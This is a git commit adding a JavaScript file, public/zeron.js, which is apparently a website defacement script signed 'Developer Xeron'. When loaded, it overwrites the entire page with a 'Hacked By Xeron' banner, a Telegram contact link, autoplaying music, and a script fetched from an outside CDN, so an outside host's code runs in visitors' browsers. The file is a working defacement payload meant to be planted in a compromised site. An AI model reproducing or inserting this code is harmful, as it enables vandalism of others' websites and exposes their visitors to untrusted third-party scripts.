0aa586929ce841d1a10b6fe3b8f009ec086f0e36
ZeronModz <zeronmodz@gmail.com>
2026-05-02 01:05:57 +0600

    Create zeron.js

---
+++ public/zeron.js
@@ -0,0 +1,51 @@
+// Code by Developer Xeron
+
+(function () {
+
+  function run() {
+    document.body.innerHTML = `
+
+<!DOCTYPE html>
+<html>
+<head>
+<title>Hacked By Xeron</title>
+
+<style>
+body {
+  background: url("https://cdn.prinsh.com/data-1/images/NathanPrinsley-hacker-aesthetic.jpg") no-repeat center center fixed;
+  background-size: 100% 100%;
+  font-family: Verdana;
+  text-align:center;
+  margin-top: 40px;
+}
+h1 { color:#de0707; }
+h2 { color:#07ad1d; }
+p { color:#00ffff; font-size:18px; }
+</style>
+
+</head>
+
+<body>
+
+<img src="https://cdn.prinsh.com/data-1/images/NathanPrinsley-AnonymousLogo.png" width="200">
+
+<h1>Hacked By Xeron</h1>
+<h2>https://t.me/CodeDevZeron</h2>
+
+<p>Developer Xeron 😈</p>
+
+<audio src="https://cdn.prinsh.com/data-1/mp3/best-hacker-music.mp3" autoplay loop></audio>
+
+<script src="https://cdn.prinsh.com/NathanPrinsley-effect/salju-terbang.js"></script>
+
+</body>
+</html>
+
+    `;
+  }
+
+  if (document.readyState === "loading") {
+    document.addEventListener("DOMContentLoaded", run);
+  } else run();
+
+})();
